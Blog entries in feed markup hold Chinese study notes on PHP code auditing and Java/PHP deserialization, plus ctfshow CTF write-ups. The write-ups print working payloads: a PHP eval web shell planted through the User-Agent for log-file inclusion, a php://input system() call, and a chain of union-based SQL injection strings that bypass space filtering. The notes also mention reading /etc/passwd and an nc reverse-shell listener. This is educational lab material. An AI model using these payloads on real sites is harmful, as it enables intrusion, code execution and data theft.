    <content><![CDATA[<h2 id="PHP代码审计-大纲-知识点"><a href="#PHP代码审计-大纲-知识点" class="headerlink" title="PHP代码审计|大纲|知识点"></a>PHP代码审计|大纲|知识点</h2><p><img src="https://pic.imgdb.cn/item/65584242c458853aef60d589.webp"><br><img src="https://pic.imgdb.cn/item/65584252c458853aef6104b8.webp"><br>1、学习计划：审计项目漏洞Demo-&gt;审计思路-&gt;完整源码框架-&gt;验证并利用漏洞<br>2、学习内容：PHP，JAVA网站应用，引入框架类开发源码，相关审计工具及插件使用<br>3、必备知识点：环境安装搭建使用，相关工具插件安装使用，掌握前期各种漏洞原理及利用<br>4、开始前准备：审计目标的程序名，版本，当前环境(系统,中间件,脚本语言等信息),各种插件等<br>5、挖掘漏洞根本：可控变量及特定函数，不存在过滤或过滤不严谨存在绕过导致的安全漏洞<br>6、代码审计的基本流程：<br>功能点或关键字分析可能存在漏洞<br>抓包或搜索关键字找到代码出处及对应文件<br>追踪过滤或接受的数据函数，寻找触发此函数或代码的地方进行触发测试</p>
<h3 id="无涉及代码框架-SQL注入"><a href="#无涉及代码框架-SQL注入" class="headerlink" title="无涉及代码框架|SQL注入"></a>无涉及代码框架|SQL注入</h3><p>Fortify代码审计工具下载以及简单使用：<a href="https://blog.csdn.net/weixin_61240867/article/details/131786965">https://blog.csdn.net/weixin_61240867/article/details/131786965</a><br>简单sql代码分析：P50 14:00<br><code>听课笔记</code><br>1、若sql语句没有带入到mysql_query函数，那么不会产生注入漏洞。<br>2、定点挖掘技巧：<br>（1）、顶点挖掘关键啊字<br>可控变量：变量接受 get post 接受关键字 $ GET<br>特定函数：<br>输出 print<br>数据库操作函数<br>特定关键字:<br>select insert update sql执行语 &#x3D;&#x3D; sgl注入漏洞<br>搜索特定关键字尝试寻找特定漏洞：<br>如:搜索echo print 尝试挖掘的就是xss漏洞<br>如:搜索$ GET $ POST 尝试挖掘的就是安全漏洞<br>（2）、定点挖掘功能点：<br>如:我要挖掘文件上传，会员中心存在文件上传的操作地址，抓包分析找到源码中的特定文件代码段，进行文件上传代码分析<br>挖掘!<br>拓展:视漏洞而定<br>sql注入 可以借助数据库监控-监控到当前页面和数据库的交互过程 (SQL执行语句)<br>断点调试: 访问页面对应代码进行断点调试(执行过程前后顺序，调用文件列表等)<br>可使用Seay源代码审计系统进行数据库监控、全局搜索关键字等（下载：<a href="https://github.com/f1tz/cnseay%EF%BC%89">https://github.com/f1tz/cnseay）</a><br>动态调试|Maccms SQL 注入分析(附注入盲注脚本)：<a href="https://www.cnblogs.com/ichunqiu/p/9548754.html">https://www.cnblogs.com/ichunqiu/p/9548754.html</a><br>双重编码绕过：源代码将%5c自动转为\，%25%35%63 转为%5c get出url编码<br>3、绕过魔术引号：宽字节注入、二次注入(需要insert与update配合且变量可控制)。<br>4、断点动态调试：<a href="https://www.cnblogs.com/ichunqiu/p/9548754.html">https://www.cnblogs.com/ichunqiu/p/9548754.html</a></p>
<h3 id="MVC-文件上传-断点调试"><a href="#MVC-文件上传-断点调试" class="headerlink" title="MVC|文件上传|断点调试"></a>MVC|文件上传|断点调试</h3><p>1、文件上传漏洞挖掘：<br>(1)关键字搜索（函数、关键字(源码注释)、全局变量等）：比如$_FILES(获取上传文件的相关信息)，move_uploades_file等<br>(2)应用功能抓包：寻找任何可能存在上传的应用功能点，比如前台会员中心，后台新闻添加等。<br>(3)漏洞举例：逻辑漏洞-先上传文件再判断后缀名，通过MIME类型来判断文件类型、前端校验文件类型而服务端未校验。<br>2、看函数时，看深紫色的函数。<br><code>3、断点调试</code><br>编译器：phpstorm、vscode–xdebug调试，用来观察文件上传所调用的函数。<br>4、MVC开发模式（思想）<br>模型Model – 管理大部分的业务逻辑和所有的数据库逻辑。模型提供了连接和操作数据库的抽象层。<br>控制器Controller - 负责响应用户请求、准备数据，以及决定如何展示数据。<br>视图View – 负责渲染数据，通过HTML方式呈现给用户。<br><a href="https://www.cnblogs.com/wsybky/p/8638876.html">https://www.cnblogs.com/wsybky/p/8638876.html</a><br><code>了解这个模型可以帮助更快找到文件上传核心代码</code><br>5、thinkphp<br>这是建立在MVC模式上的一个开发框架。<br>thinkphp以MVC为标准的一套框架。相当于thinkphp的框架是MVC，而基于thinkphp的网站的框架是thinkphp。<br>有框架的代码审计相当于审计这个框架。</p>
<h3 id="项目类RCE-文件包含、下载、删除"><a href="#项目类RCE-文件包含、下载、删除" class="headerlink" title="项目类RCE|文件包含、下载、删除"></a>项目类RCE|文件包含、下载、删除</h3><p>1、一些漏洞关键字<br>SQL注入：<br> select insert update mysql_query mysqli等<br>文件上传：<br> $FILES,type&#x3D;”file”，上传，move_upload_file()等<br> XSS跨站：<br> print print_r echo sprintf die var_dump var_export等<br>文件包含：<br> Include include_once require require_once等<br>代码执行：<br> eval assert preg replace call user func call user func array等<br>命令执行：<br> system exec shell_exec &#96;&#96; passthru pcntl_exec popen proc_open<br>变量覆盖：<br> extract() parse_str() importrequestvariables() $$等<br>反序列化：<br> serialize() unserialize() _construct _destruct等<br>通用关键字：<br> $GET $POST $REQUEST $FILES $SEVER<br> 2、xhcms-无框架-文件包含跨站-搜索或应用-include<br>通过功能点或者关键字分析可能存在漏洞抓包或者搜索关键字找到代码出处<br>通过对应文件追踪过滤或者接受的数据函数<br>寻找出发此函数或者代码的地方进行触发测试<br>通过应用及URL地址等分析可能存在xss及包含安全<br>抓包找到xSS无过滤代码块及文件包含有后缀需绕过代码块<br>3、根据网站的功能初步判断网站有哪些漏洞，如涉及到用户交互的，那么首先应当猜想是否存在sql，xss<br>而涉及文件操作的比如说下载音频之类的，考虑文件操作类的漏洞。<br>4、黑盒无法得知参数，不易得知文件删除的传参，所以，文件删除漏洞一般存在于白盒代码审计中。<br>一般网站存在一个install.lock文件，如果此文件存在那就证明该网站的数据库不是初次安装；如果可以将这个文件删除，那么就会重新安装数据库，之前的数据全部清空（清空后，相当于这个网站被重置了，知道什么后果了吧）<br>unlink，delfile是php中对应删除的函数删除数据库安装文件，可以重装数据库。</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>java反序列化|反弹shell</title>
    <url>/2023/10/23/fanxulieJava/</url>
    <content><![CDATA[<h2 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h2><p>写在前面:java的反序列化,听一节课是不足以了解的,下面提供一些关于此方面知识的链接,供大家学习。<br><a href="https://zhuanlan.zhihu.com/p/637077178">https://zhuanlan.zhihu.com/p/637077178</a><br><a href="https://blog.csdn.net/qq_21484461/article/details/131406185">https://blog.csdn.net/qq_21484461/article/details/131406185</a><br><img src="https://pic.imgdb.cn/item/6535d032c458853aef22a155.png" alt="图一" title="java反序列化"><br>java中调用api实现序列化&#x2F;反序列化<br><img src="https://pic.imgdb.cn/item/6535d0a5c458853aef238e48.png" alt="图二" title="Java中API实现"><br>1、序列化和反序列化–前面已经明确地区分过<br>序列化(Serialization): 将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区–将程序对象（内存中的数据）转为方便存储的格式存储在文件（磁盘中）,也就是内存-&gt;磁盘。<br>反序列化：从存储区中读取该数据，并将其还原为对象的过程，成为反序列化–磁盘取出,读到内存。<br>2、java反序列化常用的工具&#x2F;脚本(生成payload):ysoserial<br><a href="https://blog.csdn.net/weixin_34275734/article/details/92243836">https://blog.csdn.net/weixin_34275734/article/details/92243836</a></p>
<h2 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h2><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=36&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">Java 反序列化及命令执行代码测试:5:50</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=36&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">WebGoat_Javaweb 靶场反序列化测试:14:00</a><br>思路:<br><img src="https://pic.imgdb.cn/item/653633cfc458853aef2c1c60.jpg" alt="图三" title="思路"><br>1、序列化-》base64-》base64解密-》反序列化<br>2、这里进行对象读取时,会将读取的东西执行<br>！攻击–解码+反序列化+构造自己想要的command(payload)+序列化+base64<br>3、下方的特征可以作为序列化的标志参考:<br>一段数据以rO0AB开头，你基本可以确定这串就是JAVA序列化base64加密的数据。<br>或者如果以aced开头，那么他就是这一段java序列化的16进制。<br>4、利用反序列化时,要反弹shell(解决回显问题)–nc -lvvp 端口号 –监听命令反弹shell接收数据。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=36&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">网鼎杯javaweb-java反序列化(难-重点):50:00</a><br>思路:<br>![图四](<a href="https://pic.imgdb.cn/item/653633ebc458853aef2c5cd9.jpg">https://pic.imgdb.cn/item/653633ebc458853aef2c5cd9.jpg</a> “解析–根据数据包判断”注入点”)<br>1、登录后,常见的数据包会返回cookie、用户信息、但是这道题的回显是一段序列化的数据,而上述说的用户信息就包含在里面。<br>2、把获得的那一串先base64 decode,再用工具解析成(还原)数据;然后生成payload(序列化、bin文件),再base64 code,发送过去。<br>3、nc -lvvp 端口号 –监听命令(反弹shell接收数据)。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=36&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">网鼎杯javaweb-java反序列化(难-重点)-总结:1:19:00</a><br>1、白盒看代码判断有无java反序列化漏洞,而黑盒看数据包?。<br>2、此篇文章只是从代码分析java反序列化,但实际仍有很多类型。</p>
<h2 id="java反序列化与php反序列化区别"><a href="#java反序列化与php反序列化区别" class="headerlink" title="java反序列化与php反序列化区别"></a>java反序列化与php反序列化区别</h2><p>1、php的反序列化是依靠在不同时期自动调用的魔术方法(有类)以及代码相关函数(无类)有关;java反序列化是以代码中序列化与反序列化的转变过程中的代码执行相关。<br>2、序列化和反序列化本身没有漏洞点，只是为了实现数据的完整高效的传输。<br>PHP反序列漏洞是由于类里面的魔术方法调用了某个函数，该危险函数又调用了别的函数，最终执行到了危险函数的位置。<br>JAVA反序列化漏洞是由于开发者重写了readObject方法，该readObject方法方法调用了别的方法，最终执行到了例如Transfrom方法的危险方法（链式调用）。<br>3、Java的反序列化主要用于在分布式系统中进行对象的远程传输和存储，而PHP的反序列化主要用于在Web应用中进行数据的传输和存储。因此，在实际应用中，Java的反序列化更加复杂和灵活，而PHP的反序列化更加简单和直观。<br>参考:<a href="https://blog.csdn.net/weixin_58783105/article/details/132975714">https://blog.csdn.net/weixin_58783105/article/details/132975714</a></p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow|Recording</title>
    <url>/2023/12/02/ctfshow/</url>
    <content><![CDATA[<h2 id="web3-文件包含"><a href="#web3-文件包含" class="headerlink" title="web3|文件包含"></a>web3|文件包含</h2><p>开启靶机，第一眼确定存在文件包含。<br><img src="https://pic.imgdb.cn/item/656bea56c458853aef72031f.jpg"><br><code>看见文件包含，就要想到使用php伪协议</code><br><a href="https://blog.csdn.net/m0_56107268/article/details/127760614">https://blog.csdn.net/m0_56107268/article/details/127760614</a><br>这里常用：php:&#x2F;&#x2F;input。<br>简单来说就是当$_GET参数被包含时，并且我们可以自由控制$_GET参数的输入，就能将$_POST 发送的php代码执行。<br>前提：enctype不等于”multipart&#x2F;form-data”时，可以使用php:&#x2F;&#x2F;input来获取原始请求的数据，当enctype等于”multipart&#x2F;form-data”时php:&#x2F;&#x2F;input是无效的。<br>所以这里，我们先试一下打印phpinfo。<br><img src="https://pic.imgdb.cn/item/656bea67c458853aef724181.jpg"><br>成功打印，然后我们尝试直接命令执行列出目录。<br>post中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>直接爆出一个类似于flag的文件<br><img src="https://pic.imgdb.cn/item/656bea75c458853aef726ef5.jpg"><br>那我们直接读取即可<br><img src="https://pic.imgdb.cn/item/656bea80c458853aef72936f.jpg"><br>成功获取flag。</p>
<h2 id="web4-文件包含-日志注入"><a href="#web4-文件包含-日志注入" class="headerlink" title="web4|文件包含|日志注入"></a>web4|文件包含|日志注入</h2><p>开启靶机，怎么和上一题一样？反复确认，先尝试上一道题的方法，提示错误。<br><code>应该是当enctype等于”multipart/form-data”时php://input是无效的</code><br>然后就…不会了。<br>参考了一下师傅的思路，这里是日志注入配合文件包含。<br><code>1、查看中间件</code><br>首先得查看中间件，以确认日志的存放路径。<br>抓包查看即可，是ngnix搭建的一个网站。<br><img src="https://pic.imgdb.cn/item/656c93d0c458853aeff40789.jpg"><br><code>2、利用日志包含漏洞</code><br>日志包含漏洞的成因还是服务器没有进行严格的过滤 ，导致用户可以进行任意文件读取，<br>但是前提是服务器需要开启了记录日志的功能才可以利用这个漏洞。<br>对于Apache，日志存放路径：&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log<br>对于Ngnix，日志存放路径：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log(访问日志) 和 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log(记录处理日志)<br><code>除此之外，我们还可以尝试读取：</code><br>&#x2F;etc&#x2F;nginx&#x2F;nginx.conf：该文件是Nginx的配置的文件，该文件保存着能够影响服务器运行的配置信息。有时会泄露敏感信息。该文件支持php解析。<br>&#x2F;etc&#x2F;passwd：存储该系统的用户信息。<br><code>原理：中间件的日志文件会保存网站的访问记录,比如HTTP请求行,User-Agent,Referer等客户端信息，如果在HTTP请求中插入恶意代码,那么恶意代码就会保存到日志文件中,访问日志文件的时候，日志文件中的恶意代码就会执行,从而造成任意代码执行甚至获取shell。</code><br>这里是中间件是Nginx：<br>Nginx中的日志分两种，一种是error.log，一种是access.log。error.log可以配置成任意级别，默认级别是error，用来记录Nginx运行期间的处理流程相关的信息；access.log指的是访问日志，用来记录服务器的接入信息（包括记录用户的IP、请求处理时间、浏览器信息等）。<br><code>3、先读取error.log</code><br>e，一片空白，直接不理会。<br><code>4、再读取access.log</code><br><img src="https://pic.imgdb.cn/item/656c93eec458853aeff49f70.jpg"><br>可以看到，日志里面就是存储UA头的内容，那我们可以在UA头插入恶意php代码，然后访问，应该会回显好东西。<br>这里直接插入一句话。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>蚁剑连接即可。<br><img src="https://pic.imgdb.cn/item/656c93f4c458853aeff4b934.jpg"><br><code>注：这里我前期测试次数比较多，然后真正插入一句话时发现失效，即连接不上；后面就是重启了一下靶机环境，这才成功。推测是日志设了上限，满了就不能写入</code><br>这位师傅不用连接，直接读取，俺没有成功复现：<a href="https://blog.csdn.net/HAI_WD/article/details/132103628">https://blog.csdn.net/HAI_WD/article/details/132103628</a></p>
<h2 id="web5-ezbypass"><a href="#web5-ezbypass" class="headerlink" title="web5|ezbypass"></a>web5|ezbypass</h2><p>开启靶机，推测是绕过一些函数最终才会显示flag。<br>ctype_alpha()函数用于检测字符串中是否仅包含字母,是则返回true,否则返回false<br>is_numeric()函数用于检测变量是否为数字或数字字符串,是则返回true,否则返回false<br>这两处都可以输入字符串和输入数字绕过。<br>但是第三处</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">md5</span><span class="params">(<span class="variable">$v1</span>)</span></span>==<span class="built_in">md5</span>(<span class="variable">$v2</span>)</span><br></pre></td></tr></table></figure>
<p><code>双等号弱等于，可以找两个md5加密后开头都是0e（这样就会被认为是科学计数法）的参数进行绕过</code><br>所以我们要找一个字母字符串和数字字符串都以0e开头的，这样md5后的值为0，就实现了绕过。<br>QNKCDZO 的md5值为 0e830400451993494058024219903391<br>240610708 的md5值为 0e462097431906509019562988736854<br>对应输入即可获取flag。</p>
<h2 id="web6-sql"><a href="#web6-sql" class="headerlink" title="web6|sql"></a>web6|sql</h2><p>开启靶机，怎么又是sql注入。<br>还是判断有无注入点以及是字符型还是数字型注入。<br>e，这里输入1’|1无回显，那么直接先尝试万能密码。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; or <span class="number">1</span>=<span class="number">1</span>#</span><br></pre></td></tr></table></figure>
<p>提示注入错误<br><img src="https://pic.imgdb.cn/item/65707c1fc458853aef506bf7.jpg"><br>应该是存在过滤，进一步测试，发现是对空格存在过滤。<br><code>思路</code><br>这里是采取使用内联注释&#x2F;**&#x2F;代替空格。</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p>成功登录。<br><img src="https://pic.imgdb.cn/item/65707c31c458853aef50b800.jpg"><br><code>爆列数</code><br>这里要注意,必须要使用万能密码登陆后才可以判断回显位。</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>order<span class="comment">/**/</span><span class="keyword">by</span><span class="comment">/**/</span><span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p>判断出，3列。<br>后面也可以加上or&#x2F;**&#x2F;1&#x3D;1，只不过我习惯不加。<br><code>判断回显位</code></p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p>也可以</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;<span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p>后面同理；回显位在2.<br><img src="https://pic.imgdb.cn/item/65707c3bc458853aef50e83d.jpg"><br><code>直接爆库</code></p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="built_in">database</span>(),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65707c4bc458853aef5134d0.jpg"><br><code>直接爆表</code></p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span><span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(table_name),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="string">&#x27;web2&#x27;</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span><span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="string">&#x27;web2&#x27;</span>),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65707c5ac458853aef5176d6.jpg"><br><code>爆字段</code></p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span><span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(column_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_name=<span class="string">&#x27;flag&#x27;</span>),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65707c66c458853aef51b33b.jpg"><br><code>爆flag</code></p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span><span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span>flag<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flag),<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65707c6ac458853aef51c40a.jpg"><br>除此之外，还可以用()替换掉空格。<br>详情：<a href="https://blog.csdn.net/qq_68581192/article/details/133717059">https://blog.csdn.net/qq_68581192/article/details/133717059</a></p>
]]></content>
      <categories>
        <category>Recorder</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化</title>
    <url>/2023/10/21/fanxuliePHP/</url>
    <content><![CDATA[<h2 id="反序列化-序列化"><a href="#反序列化-序列化" class="headerlink" title="反序列化|序列化"></a>反序列化|序列化</h2><p>!!!反序列化是比较重要的,可以多方面找资源学习。<br>序列化（串行化）：是将变量转换为可保存或传输的字符串的过程(将程序对象（内存中的数据）转为方便存储的格式存储在文件（磁盘中）,即内存-&gt;磁盘)；<br>反序列化（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用；<br>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。<br><img src="https://pic.imgdb.cn/item/653481aac458853aef89d51a.png" alt="图一" title="序列化与反序列化"><br>对象-&gt;字符串 –序列化–serialize()<br>字符串-&gt;对象 –反序列化–unserialize()</p>
<h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><p><img src="https://pic.imgdb.cn/item/6534819dc458853aef89a8b2.png" alt="图二" title="php反序列化"><br>参考：<br>反序列化详解:<br><a href="https://xz.aliyun.com/t/12507">https://xz.aliyun.com/t/12507</a><br><a href="https://www.php.cn/faq/454909.html">https://www.php.cn/faq/454909.html</a><br><a href="https://blog.csdn.net/m0_69637056/article/details/125692222">https://blog.csdn.net/m0_69637056/article/details/125692222</a><br>魔术方法详解:<br><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a><br><a href="https://blog.csdn.net/qq_51295677/article/details/123394848">https://blog.csdn.net/qq_51295677/article/details/123394848</a><br>1、原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码<br>执行，SQL 注入，目录遍历等不可控后果。<br>2、如果代码中存在类(class):在反序列化的过程中可能会自动触发某些魔术方法。<br>PHP进行反序列化的两个函数:<br>serialize() &#x2F;&#x2F;将一个对象转换成一个字符串<br>unserialize() &#x2F;&#x2F;将字符串还原成一个对象<br>反序列化漏洞触发：unserialize 函数的变量可控，文件中存在可利用的类，类中有魔术方法：<br>serialize() &#x2F;&#x2F;将一个对象转换成一个字符串<br>unserialize() &#x2F;&#x2F;将字符串还原成一个对象<br>触发：unserialize 函数的变量可控，文件中存在可利用的类，类中有魔术方法：<br>__construct()	&#x2F;&#x2F;创建对象时触发<br>__destruct() 	&#x2F;&#x2F;对象被销毁时以及调用serialize()触发<br>__wakeup()      &#x2F;&#x2F;调用unserialize()前,即反序列化前触发<br>__call() 			&#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发<br>__callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发<br>__get() 			&#x2F;&#x2F;用于从不可访问的属性读取数据<br>__set() 			&#x2F;&#x2F;用于将数据写入不可访问的属性<br>__isset() 		&#x2F;&#x2F;在不可访问的属性上调用 isset()或 empty()触发<br>__unset() 		&#x2F;&#x2F;在不可访问的属性上使用 unset()时触发<br>__invoke() 		&#x2F;&#x2F;当脚本尝试将对象调用为函数时触发</p>
<h2 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h2><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=36&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">php反序列化热身–无类–本地–简单了解原理:7:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=36&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">php反序列化ctf真题–无类–实例–加深了解原理:24:00</a><br>0、序列化的输出形式<br><img src="https://pic.imgdb.cn/item/65353036c458853aefe13346.png" alt="图三" title="输出形式"><br>1、序列化后(无类)的输出结果:<br><img src="https://pic.imgdb.cn/item/65353073c458853aefe2390b.png" alt="图四" title="序列化后(无类)的输出结果"><br>1.1、反序列化(无类)后的输出结果:<br><img src="https://pic.imgdb.cn/item/653530a3c458853aefe308a8.png" alt="图五" title="反序列化(无类)后的输出结果"><br>2、&#x3D;&#x3D;&#x3D;(强类型对比)是全等，两边类型和值都一样才行。&#x3D;&#x3D;(弱类型对比)含有隐形转换，会将两边的值按一定规则转换后作比较。&#x3D;是赋值。<br>3、ctf代码存在先后以及逻辑问题,一定要看清楚。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=36&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">php反序列化–有类魔术方法触发–本地–重点学习:39:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=36&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">php反序列化网鼎杯真题–有类魔术方法触发–实例–重点学习:51:00</a><br>1、魔术方法就是代码在执行的时候,执行到某一函数就会被隐式调用的方法(与vue框架的钩子函数对比?)。<br>2、有类情况下的简单输出<br><img src="https://pic.imgdb.cn/item/653530d6c458853aefe3cb3c.png" alt="图六" title="有类情况下的简单输出"><br>3、网鼎杯解题思路<br><img src="https://pic.imgdb.cn/item/65353105c458853aefe49805.png" alt="图七" title="网鼎杯解题思路"><br>(1)、有new就有构造，然后代码结束依次销毁用析构函数。<br>(2)、这道题写一个类就是为了传参数,把参数序列化利于传输。<br>4、反序列化,你要自己懂得如何serialize() unserialize()相互转化,以及它们之间的相互转化的PHP代码如何去写。<br>5、序列化的值利于传输、反序列化的利于还原和编译? </p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=36&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">关于反序列化作用的小结:1:25:00</a><br>2、php反序列化,由于魔术方法的调用,可能会造成sql注入等的其他漏洞,这就是php反序列化漏洞。<br><img src="https://pic.imgdb.cn/item/65353130c458853aefe54f4e.png" alt="图八"></p>
<p>一些进阶小技巧:<a href="https://zhuanlan.zhihu.com/p/628402113">https://zhuanlan.zhihu.com/p/628402113</a><br><a href="https://blog.csdn.net/m0_64815693/article/details/127982134">https://blog.csdn.net/m0_64815693/article/details/127982134</a></p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>php|反序列化|本地|bugku</title>
    <url>/2023/10/24/fanxuliehuaPrac/</url>
    <content><![CDATA[<h2 id="本地编写简单代码测试"><a href="#本地编写简单代码测试" class="headerlink" title="本地编写简单代码测试"></a>本地编写简单代码测试</h2><h3 id="无类情况"><a href="#无类情况" class="headerlink" title="无类情况"></a>无类情况</h3><p>1、无类情况下,代码的序列化测试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;dralin&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$key</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行结果:<br><img src="https://pic.imgdb.cn/item/6537d12dc458853aef7406a7.jpg" alt="图一" title="无类序列化结果"><br>s:6:”dralin”;<br>s:字符串;6:字符串长度;dralin:字符串内容。<br>2、无类情况下,代码的反序列化测试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;s:6:&quot;dralin&quot;;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$key</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
